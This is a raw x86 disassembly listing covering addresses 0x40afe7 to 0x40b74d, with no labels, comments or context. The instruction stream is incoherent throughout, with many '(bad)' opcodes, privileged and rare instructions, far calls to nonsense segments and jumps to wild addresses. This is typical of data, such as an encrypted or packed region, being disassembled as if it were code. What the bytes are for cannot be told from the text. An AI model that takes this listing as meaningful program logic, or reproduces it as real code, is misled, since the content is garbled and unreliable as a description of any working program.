  40afe7:	nop
  40afe8:	ret    
  40afe9:	mov    ebp,0x15a5547a
  40afee:	retf   
  40afef:	or     eax,0x4f3b70e1
  40aff4:	sbb    al,0x2c
  40aff6:	mov    edx,0xac090ce9
  40affb:	dec    edx
  40affc:	stos   BYTE PTR es:[edi],al
  40affd:	loope  0x40b015
  40afff:	dec    edi
  40b000:	sub    esi,DWORD PTR [ebp+0x311f55fe]
  40b006:	xor    eax,0xd0d0d046
  40b00b:	mov    cl,0xd
  40b00d:	sbb    al,0x44
  40b00f:	and    al,0x1a
  40b011:	sar    ebp,0xcc
  40b014:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b015:	(bad)  
  40b016:	jg     0x40b059
  40b018:	cwde   
  40b019:	ss icebp 
  40b01b:	lods   eax,DWORD PTR ds:[esi]
  40b01c:	cld    
  40b01d:	dec    edi
  40b01e:	js     0x40b04c
  40b020:	outs   dx,DWORD PTR ds:[esi]
  40b021:	pop    ebp
  40b022:	in     eax,0xb
  40b024:	sub    al,0x38
  40b026:	into   
  40b027:	sbb    BYTE PTR [esi+ecx*2],bl
  40b02a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02b:	test   DWORD PTR [edi],edi
  40b02d:	dec    eax
  40b02e:	pop    ss
  40b02f:	push   esi
  40b030:	inc    esp
  40b031:	and    DWORD PTR [edx+0x14],esi
  40b034:	mov    DWORD PTR [edx],eax
  40b036:	xchg   ebx,eax
  40b037:	mov    eax,0x9d6080c8
  40b03c:	jmp    0x40afc8
  40b03e:	sbb    BYTE PTR [edx-0x39ae591d],ah
  40b044:	call   0x4326:0xa443fc88
  40b04b:	push   0x59979ba5
  40b050:	inc    ebp
  40b051:	mov    al,bl
  40b053:	pop    edx
  40b054:	test   eax,0x3fa4298c
  40b059:	add    dh,BYTE PTR ds:0x5f75648a
  40b05f:	xor    DWORD PTR [ebp-0x4],0x62b83502
  40b066:	xchg   esp,eax
  40b067:	mov    dh,0x42
  40b069:	sti    
  40b06a:	dec    esi
  40b06b:	sbb    DWORD PTR [edx],eax
  40b06d:	dec    esi
  40b06e:	jae    0x40aff8
  40b070:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b071:	stc    
  40b072:	cmp    ebp,DWORD PTR [ecx]
  40b074:	std    
  40b075:	sub    DWORD PTR [edi],ecx
  40b077:	add    ch,bl
  40b079:	aas    
  40b07a:	jecxz  0x40b0f3
  40b07c:	adc    DWORD PTR [ebx+0x55],esi
  40b07f:	std    
  40b080:	(bad)  
  40b081:	or     esp,DWORD PTR [esi-0x2ccfb45f]
  40b087:	mov    ecx,0x27667e99
  40b08c:	inc    ebp
  40b08d:	test   eax,0xcfc99188
  40b092:	mov    ch,0x4a
  40b094:	xchg   esp,eax
  40b095:	(bad)  
  40b096:	mov    bl,BYTE PTR [edi+0x11]
  40b099:	mov    ecx,0x7f60ffc7
  40b09e:	ret    0x97b4
  40b0a1:	ror    ah,1
  40b0a3:	popf   
  40b0a4:	sub    BYTE PTR [ecx+0x4dc6a371],ah
  40b0aa:	lea    edi,[edi-0x64d63ff2]
  40b0b0:	sbb    al,0xf0
  40b0b2:	add    bl,al
  40b0b4:	ds in  al,0x13
  40b0b7:	lahf   
  40b0b8:	scas   al,BYTE PTR es:[edi]
  40b0b9:	push   ebp
  40b0ba:	lea    ebx,ds:0x2175b25
  40b0c0:	inc    esp
  40b0c1:	xor    BYTE PTR [esi+0x5f],cl
  40b0c4:	jg     0x40b0cd
  40b0c6:	cmp    al,0x7b
  40b0c8:	dec    ebp
  40b0c9:	cld    
  40b0ca:	adc    eax,0x143f3fcb
  40b0cf:	pop    ss
  40b0d0:	adc    eax,0x155e55dc
  40b0d5:	ret    0x7bd8
  40b0d8:	ss jle 0x40b126
  40b0db:	dec    ebp
  40b0dc:	fimul  WORD PTR [esi-0x5123c01b]
  40b0e2:	dec    ebx
  40b0e3:	ja     0x40b127
  40b0e5:	arpl   WORD PTR [edx+ebp*4-0x25377cd2],si
  40b0ec:	pushw  0xffc4
  40b0ef:	pop    ecx
  40b0f0:	push   0x41
  40b0f2:	push   edi
  40b0f3:	(bad)  
  40b0f4:	retf   
  40b0f5:	cmp    DWORD PTR cs:[ebx-0x58399bc7],ecx
  40b0fc:	pop    edi
  40b0fd:	cmc    
  40b0fe:	hlt    
  40b0ff:	std    
  40b100:	jae    0x40b155
  40b102:	push   esi
  40b103:	outs   dx,BYTE PTR ds:[esi]
  40b104:	add    al,0xa1
  40b106:	sub    al,0x19
  40b108:	mov    esi,0xc10fe670
  40b10d:	mov    ds:0x92224cdd,eax
  40b112:	enter  0x4d06,0x22
  40b116:	test   al,0x56
  40b118:	inc    ebx
  40b119:	js     0x40b0af
  40b11b:	jle    0x40b17f
  40b11d:	(bad)  
  40b11e:	mov    esp,0x174077ba
  40b123:	cmp    BYTE PTR [edx-0x35],ch
  40b126:	retf   
  40b127:	in     eax,0xcd
  40b129:	addr16 ss dec edx
  40b12c:	outs   dx,BYTE PTR ds:[esi]
  40b12d:	cmp    al,0x84
  40b12f:	test   DWORD PTR [ebx-0x21461bcc],ebp
  40b135:	fcom   DWORD PTR [ebp+0x10]
  40b138:	fcmovne st,st(7)
  40b13a:	adc    BYTE PTR [edi+ebx*4+0x5a],ch
  40b13e:	arpl   WORD PTR ds:0x1908180b,ax
  40b144:	push   ecx
  40b145:	push   edi
  40b146:	or     esp,ebp
  40b148:	push   edi
  40b149:	or     DWORD PTR [eax-0x77],0xffffffaa
  40b14d:	sar    esi,cl
  40b14f:	outs   dx,DWORD PTR ds:[esi]
  40b150:	(bad)  [edi-0x284eec33]
  40b156:	jge    0x40b1b3
  40b158:	sahf   
  40b159:	jmp    0x66d04d89
  40b15e:	fisub  WORD PTR [ebp+edi*1+0x6a]
  40b162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b164:	ds hlt 
  40b166:	enter  0xb961,0x34
  40b16a:	scas   eax,DWORD PTR es:[edi]
  40b16b:	cmp    al,0x8
  40b16d:	adc    eax,0xcccef52
  40b172:	pop    ebx
  40b173:	shr    BYTE PTR [ebp-0x2375f966],cl
  40b179:	adc    bl,BYTE PTR [esi-0x1f68ff48]
  40b17f:	rcr    DWORD PTR [edx-0x3225ec9d],cl
  40b185:	data16 sub bl,dh
  40b188:	dec    ebx
  40b189:	inc    edi
  40b18a:	mov    al,ds:0x4fabd791
  40b18f:	cwde   
  40b190:	xchg   ebx,eax
  40b191:	cmp    DWORD PTR [esp+ebx*8-0x97d15c4],ebx
  40b198:	test   DWORD PTR [esi-0x4b52c341],edi
  40b19e:	and    ch,BYTE PTR [edi+0x3]
  40b1a1:	les    eax,FWORD PTR [ebx+0x23a0a0cc]
  40b1a7:	mov    ebp,0x35d5a9c9
  40b1ac:	pop    ds
  40b1ad:	das    
  40b1ae:	popa   
  40b1af:	or     al,0xb0
  40b1b1:	sub    al,0xcc
  40b1b3:	push   edx
  40b1b4:	pop    esp
  40b1b5:	int    0xc2
  40b1b7:	cmp    DWORD PTR [edx],eax
  40b1b9:	(bad)  
  40b1ba:	xchg   ebx,eax
  40b1bb:	and    al,ah
  40b1bd:	in     al,dx
  40b1be:	hlt    
  40b1bf:	xor    ebx,DWORD PTR [ecx+0x33137141]
  40b1c5:	out    dx,al
  40b1c6:	sbb    eax,0x10da09e
  40b1cb:	pop    ds
  40b1cc:	fwait
  40b1cd:	jae    0x40b153
  40b1cf:	icebp  
  40b1d0:	add    eax,0x6f449f6
  40b1d5:	icebp  
  40b1d6:	lahf   
  40b1d7:	xchg   esi,eax
  40b1d8:	inc    esi
  40b1d9:	cmc    
  40b1da:	imul   ebx,DWORD PTR [eax-0x26],0xffffffd6
  40b1de:	sbb    al,0x9
  40b1e0:	dec    eax
  40b1e1:	pop    ds
  40b1e2:	(bad)  ds:0x4c5921aa
  40b1e9:	out    dx,al
  40b1ea:	in     al,dx
  40b1eb:	xchg   ebp,eax
  40b1ec:	sub    BYTE PTR [esp+edx*8],dh
  40b1ef:	sahf   
  40b1f0:	jle    0x40b1a9
  40b1f2:	xor    BYTE PTR [edx],dl
  40b1f4:	pop    es
  40b1f5:	in     al,0x75
  40b1f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1f8:	jnp    0x40b23e
  40b1fa:	ror    esp,0xc8
  40b1fd:	pop    edi
  40b1fe:	mov    ss,edi
  40b200:	jbe    0x40b1ab
  40b202:	repnz mov esp,esp
  40b205:	retf   0x2a0e
  40b208:	cmp    dh,BYTE PTR [ecx-0x7275c1a4]
  40b20e:	sbb    DWORD PTR ds:0x720ca6fb,edi
  40b214:	pop    ecx
  40b215:	jg     0x40b22f
  40b217:	sar    al,cl
  40b219:	gs pop ds
  40b21b:	out    dx,al
  40b21c:	sti    
  40b21d:	cld    
  40b21e:	xor    bl,BYTE PTR [edi-0x2c]
  40b221:	nop
  40b222:	sub    BYTE PTR [ebx-0x68cf3c73],bl
  40b228:	jo     0x40b28d
  40b22a:	inc    ebp
  40b22b:	mov    esp,0x622b9ccc
  40b230:	mov    cl,0xbb
  40b232:	push   ss
  40b233:	and    al,0xa
  40b235:	pop    eax
  40b236:	jno    0x40b2a9
  40b238:	mov    WORD PTR [eax-0xc83f423],fs
  40b23e:	cli    
  40b23f:	loop   0x40b295
  40b241:	xor    eax,0x50
  40b244:	or     BYTE PTR [eax],dl
  40b246:	mul    DWORD PTR [esp+esi*2]
  40b249:	mov    BYTE PTR [eax-0x3162ec76],bl
  40b24f:	xchg   ebp,eax
  40b250:	or     BYTE PTR ds:0xf96d20f,al
  40b256:	push   cs
  40b257:	or     eax,0x14be0853
  40b25c:	dec    edi
  40b25d:	ja     0x40b21d
  40b25f:	rcl    BYTE PTR [ecx-0x49],1
  40b262:	mov    cl,0x9b
  40b264:	xchg   edx,eax
  40b265:	xor    BYTE PTR [ecx+0x35],al
  40b268:	shr    BYTE PTR [edi],1
  40b26a:	pop    ds
  40b26b:	lock pop eax
  40b26d:	lahf   
  40b26e:	pop    ss
  40b26f:	dec    esp
  40b270:	xchg   esp,eax
  40b271:	xor    eax,0xce9115ee
  40b276:	sbb    al,0x66
  40b278:	jmp    0x40b2a8
  40b27a:	lar    ebp,WORD PTR [edi-0x6d]
  40b27e:	lock add bl,ah
  40b281:	sti    
  40b282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b283:	cmp    bl,ch
  40b285:	sub    al,0xc1
  40b287:	jmp    0x40b2a4
  40b289:	or     dh,bl
  40b28b:	jo     0x40b25b
  40b28d:	fisttp QWORD PTR [eax-0x72]
  40b290:	shl    al,cl
  40b292:	push   edx
  40b293:	or     BYTE PTR [esi+edx*8+0x68],dl
  40b297:	ja     0x40b2a0
  40b299:	pop    ebp
  40b29a:	xor    eax,0xbf3dfc39
  40b29f:	es sbb ecx,esp
  40b2a2:	test   eax,0x8f5add9b
  40b2a7:	or     dl,BYTE PTR [ebx]
  40b2a9:	mov    dh,0x2f
  40b2ab:	pop    edx
  40b2ac:	(bad)  [ecx]
  40b2ae:	xchg   esp,eax
  40b2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2b0:	xor    DWORD PTR [ebx],0xe818ea71
  40b2b6:	cmp    edi,DWORD PTR [ebp-0x14]
  40b2b9:	js     0x40b242
  40b2bb:	sti    
  40b2bc:	cmp    al,dh
  40b2be:	je     0x40b28d
  40b2c0:	push   ss
  40b2c1:	mov    cl,0xf5
  40b2c3:	jae    0x40b273
  40b2c5:	scas   eax,DWORD PTR es:[edi]
  40b2c6:	dec    edx
  40b2c7:	ror    BYTE PTR [esi+0x49],cl
  40b2ca:	pop    edx
  40b2cb:	xchg   ebp,eax
  40b2cc:	pop    esp
  40b2cd:	or     al,0x8c
  40b2cf:	push   ds
  40b2d0:	push   cs
  40b2d1:	mov    ecx,0x27d408d1
  40b2d6:	(bad)  
  40b2d7:	jbe    0x40b325
  40b2d9:	fisttp DWORD PTR [ecx]
  40b2db:	jo     0x40b2b1
  40b2dd:	xlat   BYTE PTR ds:[ebx]
  40b2de:	cmp    al,0xc8
  40b2e0:	or     al,0x62
  40b2e2:	dec    ecx
  40b2e3:	jl     0x40b338
  40b2e5:	mov    bl,0xbd
  40b2e7:	lock je 0x40b326
  40b2ea:	sahf   
  40b2eb:	push   ebp
  40b2ec:	mov    edx,0xbdce33b9
  40b2f1:	lock aaa 
  40b2f3:	test   BYTE PTR [edi-0x65],bl
  40b2f6:	cmp    BYTE PTR [esi],0x4
  40b2f9:	mov    ebx,0xe7be4be3
  40b2fe:	dec    ebx
  40b2ff:	icebp  
  40b300:	mov    WORD PTR [ebp+0x28],ds
  40b303:	mov    al,0x6c
  40b305:	in     al,dx
  40b306:	xor    eax,0xc5af66af
  40b30b:	dec    esi
  40b30c:	push   es
  40b30d:	adc    dh,dh
  40b30f:	outs   dx,DWORD PTR ds:[esi]
  40b310:	fidivr WORD PTR ds:0x8c0616e0
  40b316:	push   0x24
  40b318:	mov    ah,0xec
  40b31a:	sub    bl,al
  40b31c:	sar    DWORD PTR [esi-0x55],1
  40b31f:	cmp    eax,0x24978539
  40b324:	call   0xa395:0x3fe9c8ae
  40b32b:	adc    BYTE PTR [ebp+0x4a],bl
  40b32e:	pop    edx
  40b32f:	mov    ch,0xec
  40b331:	(bad)  
  40b332:	(bad)  
  40b334:	mov    bh,0x23
  40b336:	retf   
  40b337:	iret   
  40b338:	fs dec ebp
  40b33a:	or     BYTE PTR [edi-0x4dbaf890],dh
  40b340:	jg     0x40b2e1
  40b342:	or     eax,0xc1828e70
  40b347:	adc    DWORD PTR [edx],ebp
  40b349:	xor    DWORD PTR [edi],edi
  40b34b:	pop    esi
  40b34c:	mov    ecx,0xe2984c3c
  40b351:	outs   dx,DWORD PTR ds:[esi]
  40b352:	aam    0xfe
  40b354:	dec    ecx
  40b355:	lds    edi,FWORD PTR [eax+0x46e281c0]
  40b35b:	mov    eax,esp
  40b35d:	mov    bl,0x98
  40b35f:	int    0x9
  40b361:	int3   
  40b362:	dec    ebx
  40b363:	mov    ds:0xc358cff5,al
  40b368:	inc    ebp
  40b369:	mov    WORD PTR [edi],gs
  40b36b:	cli    
  40b36c:	imul   edx,DWORD PTR [edi],0xf7213317
  40b372:	xor    al,bh
  40b374:	daa    
  40b375:	mov    ah,0x54
  40b377:	xadd   ebx,eax
  40b37a:	icebp  
  40b37b:	lea    edx,[edi]
  40b37d:	(bad)  
  40b37e:	rcr    BYTE PTR [edx],cl
  40b380:	sar    BYTE PTR [eax+ecx*4-0x3e],0x94
  40b385:	mov    al,ds:0xab672c7f
  40b38a:	loopne 0x40b332
  40b38c:	or     BYTE PTR [ebp-0x4d384f31],al
  40b392:	stos   BYTE PTR es:[edi],al
  40b393:	mov    ch,0x26
  40b395:	jbe    0x40b3b5
  40b397:	mov    ebp,0xd03bae84
  40b39c:	push   cs
  40b39d:	jne    0xf3890287
  40b3a3:	test   BYTE PTR [esi],bh
  40b3a5:	inc    edi
  40b3a6:	les    ecx,FWORD PTR [ebp-0x7d702a7a]
  40b3ac:	or     eax,0x7f41adb4
  40b3b1:	fsub   QWORD PTR [eax-0x58]
  40b3b4:	push   ds
  40b3b5:	(bad)  
  40b3b6:	fild   DWORD PTR [esi-0x31]
  40b3b9:	cmp    al,0xf3
  40b3bb:	push   ds
  40b3bc:	sub    dh,BYTE PTR [ebp+esi*8+0x0]
  40b3c0:	xor    ebx,DWORD PTR [ecx-0x62aca045]
  40b3c6:	daa    
  40b3c7:	xchg   ebp,eax
  40b3c8:	mov    WORD PTR [esi],cs
  40b3ca:	nop
  40b3cb:	mov    ah,0x3a
  40b3cd:	mov    ecx,0xc4f2bad8
  40b3d2:	xor    BYTE PTR [edx+0x15],dh
  40b3d5:	gs retf 0x23c9
  40b3d9:	sbb    ch,BYTE PTR ds:0xea39186f
  40b3df:	jp     0x40b3c6
  40b3e1:	cmp    bh,BYTE PTR [ecx+eiz*8-0x2f]
  40b3e5:	mov    BYTE PTR [ecx-0x668eca07],cl
  40b3eb:	xchg   edi,eax
  40b3ec:	pop    ecx
  40b3ed:	cli    
  40b3ee:	add    DWORD PTR [edx+0x6a],ecx
  40b3f1:	(bad)  
  40b3f2:	xchg   esp,eax
  40b3f3:	pop    es
  40b3f4:	dec    ebp
  40b3f5:	or     al,0x68
  40b3f7:	loopne 0x40b441
  40b3f9:	xchg   edi,eax
  40b3fa:	sbb    al,0x10
  40b3fc:	clc    
  40b3fd:	int    0x13
  40b3ff:	push   ds
  40b400:	in     eax,0x11
  40b402:	push   eax
  40b403:	inc    ebp
  40b404:	push   es
  40b405:	addr16 jge 0x40b3cd
  40b408:	push   ds
  40b409:	loope  0x40b3cd
  40b40b:	mov    ecx,0x264f2553
  40b410:	in     al,0x69
  40b412:	pop    esp
  40b413:	xchg   BYTE PTR [ebx-0xf96cc69],dh
  40b419:	rol    DWORD PTR fs:[ecx+eiz*4+0x7f],0xad
  40b41f:	test   BYTE PTR [ebx+0x6381ad68],ch
  40b425:	mov    BYTE PTR [esi+0x540afe92],0xcf
  40b42c:	inc    edx
  40b42d:	(bad)  
  40b42f:	and    al,0x11
  40b431:	and    DWORD PTR [eax],0xc69da959
  40b437:	pop    edx
  40b438:	xchg   ebp,eax
  40b439:	sub    BYTE PTR [ecx],0xd3
  40b43c:	arpl   cx,si
  40b43e:	jg     0x40b49a
  40b440:	pop    esi
  40b441:	std    
  40b442:	cld    
  40b443:	neg    DWORD PTR [esi+0x12]
  40b446:	loopne 0x40b446
  40b448:	and    DWORD PTR [esi+0x79],edx
  40b44b:	xchg   esi,eax
  40b44c:	nop
  40b44d:	push   es
  40b44e:	adc    bl,BYTE PTR [eax]
  40b450:	push   eax
  40b451:	popf   
  40b452:	(bad)  
  40b453:	fwait
  40b454:	call   0xad84bb38
  40b459:	inc    ebx
  40b45a:	fisttp QWORD PTR [eax-0x6571895d]
  40b460:	pushf  
  40b461:	pop    edx
  40b462:	lock mov bh,0xf4
  40b465:	sbb    al,0xee
  40b467:	xchg   DWORD PTR [ecx+0x43],esi
  40b46a:	mov    bl,0x1a
  40b46c:	inc    esi
  40b46d:	cdq    
  40b46e:	cdq    
  40b46f:	inc    ecx
  40b470:	ret    
  40b471:	cmp    eax,0x31f2f920
  40b476:	push   eax
  40b477:	sub    BYTE PTR [ebx+eax*1],0x86
  40b47b:	jne    0x40b448
  40b47d:	ins    BYTE PTR es:[edi],dx
  40b47e:	xchg   ebp,eax
  40b47f:	popa   
  40b480:	adc    BYTE PTR [ebp-0x20c8c525],al
  40b486:	pop    eax
  40b487:	sbb    eax,0x5b9d08c6
  40b48c:	outs   dx,BYTE PTR ds:[esi]
  40b48d:	xchg   edi,esi
  40b48f:	and    eax,0xf68adb90
  40b494:	imul   ebp,DWORD PTR [edx-0x25],0x1e041eb4
  40b49b:	cmp    eax,0x28d36438
  40b4a0:	call   0xf702ac32
  40b4a5:	imul   ebp,DWORD PTR [ecx],0xe2bd69b
  40b4ab:	push   eax
  40b4ac:	pop    es
  40b4ad:	push   es
  40b4ae:	out    0x9a,eax
  40b4b0:	xor    edx,DWORD PTR [edi+eiz*1]
  40b4b3:	aam    0x5c
  40b4b5:	xor    dh,BYTE PTR [esi]
  40b4b7:	inc    ebx
  40b4b8:	ins    BYTE PTR es:[edi],dx
  40b4b9:	xor    eax,0x30317bd7
  40b4be:	and    DWORD PTR [ecx+0x1a],edi
  40b4c1:	loopne 0x40b518
  40b4c3:	pop    edx
  40b4c4:	loopne 0x40b512
  40b4c6:	cmc    
  40b4c7:	mov    ds:0x88e51827,eax
  40b4cc:	or     al,0x5b
  40b4ce:	mov    ds:0xf9e05afa,eax
  40b4d3:	mov    al,BYTE PTR [esi+0x17eb34a7]
  40b4d9:	xchg   BYTE PTR [edx-0x7e],cl
  40b4dc:	dec    ebp
  40b4dd:	jge    0x40b4ed
  40b4df:	ins    WORD PTR es:[edi],dx
  40b4e1:	xchg   ebp,eax
  40b4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4e4:	scas   al,BYTE PTR es:[edi]
  40b4e5:	mov    WORD PTR [esi-0x35d11a5c],cs
  40b4eb:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40b4ed:	adc    ebp,DWORD PTR [ebx+eiz*4]
  40b4f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4f1:	mov    dh,0x4e
  40b4f3:	cli    
  40b4f4:	iret   
  40b4f5:	fwait
  40b4f6:	pop    ecx
  40b4f7:	adc    al,0x31
  40b4f9:	cmp    DWORD PTR [ebx],ebp
  40b4fb:	push   ebx
  40b4fc:	xor    DWORD PTR [edx+eiz*4+0x75dc1f6b],eax
  40b503:	sub    BYTE PTR [ebx-0x1b70bf44],bl
  40b509:	imul   edx,edi,0xffffffab
  40b50c:	xlat   BYTE PTR ds:[ebx]
  40b50d:	mov    al,ds:0xba3cf0c5
  40b512:	mov    dh,0x8b
  40b514:	mov    ds:0x9d17cb5e,eax
  40b519:	push   ds
  40b51a:	push   edi
  40b51b:	fs addr16 pop ebx
  40b51e:	pop    ds
  40b51f:	pop    ss
  40b520:	push   esi
  40b521:	sbb    DWORD PTR [esp+ebp*4-0x40],edi
  40b525:	mov    BYTE PTR [ebp+0x6964c0d5],bh
  40b52b:	repz and eax,0xa008522b
  40b531:	add    eax,0x5d759bb3
  40b536:	(bad)  
  40b537:	or     al,0x76
  40b539:	mov    dl,0x87
  40b53b:	mov    ebp,DWORD PTR [ecx-0x5a]
  40b53e:	ret    
  40b53f:	add    dl,ch
  40b541:	aad    0x8d
  40b543:	push   ss
  40b544:	imul   ecx,DWORD PTR [edx+ebx*8+0x6f76adbb],0x73
  40b54c:	cmp    eax,0x17b50bd7
  40b551:	in     eax,dx
  40b552:	mov    ds:0xe0a8fd5b,eax
  40b557:	int    0x47
  40b559:	mov    bh,0x27
  40b55b:	jb     0x40b5b1
  40b55d:	adc    BYTE PTR [ecx],ah
  40b55f:	cmp    DWORD PTR ds:[ebp-0x4],edx
  40b563:	into   
  40b564:	rol    BYTE PTR [ebx+0x2e],cl
  40b567:	stos   DWORD PTR es:[edi],eax
  40b568:	pop    ebp
  40b569:	bound  ebp,QWORD PTR [edx+0x63]
  40b56c:	pop    esi
  40b56d:	xor    edx,eax
  40b56f:	repz fisubr DWORD PTR [eax-0x19]
  40b573:	fcmovbe st,st(3)
  40b575:	ja     0x40b59e
  40b577:	scas   al,BYTE PTR es:[edi]
  40b578:	lds    ebx,FWORD PTR [ebx-0x43106a7]
  40b57e:	retf   
  40b57f:	sbb    dl,BYTE PTR [ebp-0x9]
  40b582:	sbb    al,0x2a
  40b584:	cmp    eax,0xd2fff947
  40b589:	pop    eax
  40b58a:	sti    
  40b58b:	std    
  40b58c:	dec    ebp
  40b58d:	mov    ecx,0x6cf31f9f
  40b592:	repz xor cl,BYTE PTR [ebx]
  40b595:	adc    ah,al
  40b597:	mov    dl,BYTE PTR [edi]
  40b599:	cmp    edi,edx
  40b59b:	sub    BYTE PTR [ecx-0x5b],cl
  40b59e:	mov    dh,0x5c
  40b5a0:	adc    eax,0x8a29400a
  40b5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5a6:	cwde   
  40b5a7:	mov    esp,0x4136ae53
  40b5ac:	xor    bl,dl
  40b5ae:	xor    bh,dh
  40b5b0:	dec    esp
  40b5b1:	shl    BYTE PTR [eax+0x777fb4b9],cl
  40b5b7:	mov    DWORD PTR [edx+ebx*4-0x18],ebx
  40b5bb:	and    BYTE PTR [eax-0x35],bh
  40b5be:	dec    ebx
  40b5bf:	cmp    eax,0x27c19e64
  40b5c4:	(bad)  
  40b5c5:	in     eax,dx
  40b5c6:	mov    bl,0xd3
  40b5c8:	stos   DWORD PTR es:[edi],eax
  40b5c9:	pop    ecx
  40b5ca:	jmp    0x8d758cb3
  40b5cf:	and    ch,BYTE PTR [edi-0x2ecec2ae]
  40b5d5:	sub    DWORD PTR [eax+0x5e573c13],ebp
  40b5db:	jecxz  0x40b5d1
  40b5dd:	sub    eax,0x676040a1
  40b5e2:	and    al,0x4b
  40b5e4:	sub    al,dh
  40b5e6:	leave  
  40b5e7:	daa    
  40b5e8:	hlt    
  40b5e9:	cmp    DWORD PTR [esi],ebx
  40b5eb:	adc    BYTE PTR [ecx],al
  40b5ed:	stc    
  40b5ee:	aaa    
  40b5ef:	(bad)  
  40b5f0:	imul   edx,DWORD PTR [ebx+0xe424791],0x4
  40b5f7:	(bad)  
  40b5f8:	repz (bad) 
  40b5fa:	data16 jge 0x40b5cc
  40b5fd:	mov    ds:0xd0e0d176,al
  40b602:	xor    DWORD PTR [ebp+ebx*8-0x383598be],esp
  40b609:	mov    ch,al
  40b60b:	frstor [ebx]
  40b60d:	jns    0x40b638
  40b60f:	cmp    BYTE PTR [edi],bl
  40b611:	xchg   edx,eax
  40b612:	lock ins DWORD PTR es:[edi],dx
  40b614:	stos   BYTE PTR es:[edi],al
  40b615:	imul   eax,DWORD PTR ds:0x3e3efc,0xfffffffd
  40b61c:	in     al,0x68
  40b61e:	shr    ebx,0xcc
  40b621:	or     eax,0x457bc2e5
  40b626:	jmp    0xb5af42d1
  40b62b:	add    DWORD PTR [edi+0x7c],esi
  40b62e:	mov    al,ds:0x5066ffba
  40b633:	cmp    edi,edi
  40b635:	retf   0xe3b4
  40b638:	test   dh,0x35
  40b63b:	push   ecx
  40b63c:	adc    al,0x9d
  40b63e:	push   ebp
  40b63f:	xor    bl,dh
  40b641:	xchg   edx,eax
  40b642:	into   
  40b643:	fild   WORD PTR [eax]
  40b645:	dec    eax
  40b646:	loop   0x40b64e
  40b648:	imul   esp,ebp,0x10
  40b64b:	cmp    ecx,DWORD PTR [ebx+ebp*2-0x4]
  40b64f:	lea    ebp,[ebx-0x7c]
  40b652:	mov    bh,0x83
  40b654:	jo     0x40b663
  40b656:	or     eax,0xa659dc69
  40b65b:	jg     0x40b6cb
  40b65d:	data16 jecxz 0x40b610
  40b660:	xchg   edi,eax
  40b661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b662:	adc    al,0x29
  40b664:	in     al,0x6d
  40b666:	add    DWORD PTR [esi-0x44d73d60],eax
  40b66c:	push   ebx
  40b66d:	lock cdq 
  40b66f:	pop    ebp
  40b670:	xchg   DWORD PTR [ebp+0xd],ecx
  40b673:	aaa    
  40b674:	adc    eax,0xffa71d1a
  40b679:	xor    DWORD PTR [esp+edi*2+0x23],0x29c8e8cc
  40b681:	std    
  40b682:	pop    edi
  40b683:	push   ebp
  40b684:	sub    edi,esi
  40b686:	mov    bh,0xce
  40b688:	or     BYTE PTR [edx-0x22],0x24
  40b68c:	inc    eax
  40b68d:	mov    eax,ds:0x2101fc6c
  40b692:	cmp    eax,0x52b7da59
  40b697:	aam    0x5
  40b699:	jbe    0x40b682
  40b69b:	jmp    0x40b6a7
  40b69d:	retf   0x3394
  40b6a0:	pop    edi
  40b6a1:	and    eax,0x5cc08cf5
  40b6a6:	jmp    0x41264fe2
  40b6ab:	pop    edx
  40b6ac:	xor    BYTE PTR [ecx],dl
  40b6ae:	mov    edx,0x12c01acd
  40b6b3:	xchg   edx,eax
  40b6b4:	(bad)  
  40b6b5:	fwait
  40b6b6:	pop    ds
  40b6b7:	das    
  40b6b8:	sahf   
  40b6b9:	mov    eax,0x1b00b7d6
  40b6be:	loop   0x40b6ab
  40b6c0:	mov    BYTE PTR [ebp-0x4b],cl
  40b6c3:	mov    eax,0xcdc36939
  40b6c8:	pop    ss
  40b6c9:	nop
  40b6ca:	sbb    dl,BYTE PTR [edx+0x2f]
  40b6cd:	ret    0x143a
  40b6d0:	mov    ds:0x93c464a3,eax
  40b6d5:	push   ebx
  40b6d6:	jns    0x40b695
  40b6d8:	mov    edx,cr6
  40b6db:	call   0x90f9c7b1
  40b6e0:	adc    ch,ch
  40b6e2:	push   esp
  40b6e3:	rcl    BYTE PTR [edx+0x3d],0x21
  40b6e7:	fcmovu st,st(3)
  40b6e9:	stc    
  40b6ea:	aas    
  40b6eb:	ins    BYTE PTR es:[edi],dx
  40b6ec:	lock (bad) 
  40b6ee:	popa   
  40b6ef:	add    DWORD PTR [ecx+edx*4],eax
  40b6f2:	mov    dl,0x69
  40b6f4:	scas   al,BYTE PTR es:[edi]
  40b6f5:	std    
  40b6f6:	imul   ebx,DWORD PTR [edi+0x689bf232],0x1a5a7c16
  40b700:	in     al,0x4c
  40b702:	loopne 0x40b6b9
  40b704:	cmp    DWORD PTR [edx-0x78],eax
  40b707:	out    0xf4,al
  40b709:	std    
  40b70a:	cdq    
  40b70b:	xor    ecx,DWORD PTR [edx-0x8]
  40b70e:	pop    ecx
  40b70f:	jmp    0x40b6c5
  40b711:	fidivr DWORD PTR [esi+0x22e994be]
  40b717:	test   edi,esp
  40b719:	scas   al,BYTE PTR es:[edi]
  40b71a:	xor    BYTE PTR [edx],bl
  40b71c:	enter  0xa325,0xa8
  40b720:	adc    eax,0x4ac9c1bf
  40b725:	sub    DWORD PTR [edi-0x1d],esp
  40b728:	mov    bh,0x4c
  40b72a:	sbb    eax,0x4e3552ec
  40b72f:	fcom   QWORD PTR [ecx-0x1b7f68cc]
  40b735:	push   edi
  40b736:	test   edi,0x4af4a8f8
  40b73c:	lods   eax,DWORD PTR ds:[esi]
  40b73d:	test   eax,0x4722987c
  40b742:	cmp    ch,BYTE PTR [ebx+edx*8]
  40b745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b746:	inc    edi
  40b747:	enter  0xed7c,0x32
  40b74b:	outs   dx,BYTE PTR ds:[esi]
  40b74c:	dec    ebx
  40b74d:	inc    esp
